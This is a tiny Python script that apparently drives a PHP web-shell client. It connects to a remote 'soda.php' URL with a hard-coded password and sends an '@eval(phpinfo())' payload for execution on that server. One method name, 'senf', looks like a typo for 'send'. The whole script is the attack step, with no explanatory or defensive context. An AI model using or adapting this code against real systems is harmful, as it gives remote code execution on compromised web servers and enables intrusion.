
from test import Raise

roll = Raise()

url = "http://havana.com/soda.php"
password = 'smart'
roll.cp(url, password)
original_payload = '@eval(phpinfo())'
roll.senf(original_payload)

